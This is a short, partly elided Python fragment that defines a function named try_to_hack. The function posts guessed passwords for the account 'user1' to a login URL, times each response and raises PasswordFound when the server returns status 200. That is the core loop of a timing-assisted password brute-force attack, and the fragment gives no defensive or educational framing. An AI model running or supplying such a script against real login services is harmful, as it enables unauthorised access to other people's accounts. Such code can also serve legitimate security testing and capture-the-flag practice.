...
def try_to_hack(characters):
    ...
    for i in range(N):
        ...
        result = requests.post(URL, data='{"username": "user1", "password": "%s"}' % characters, headers={'Content-Type': 'application/json'})
        after = time.perf_counter()

        if result.status_code == 200:
            raise PasswordFound(characters)
        elif result.status_code != 403:
            raise Exception(result.text, result.status_code)
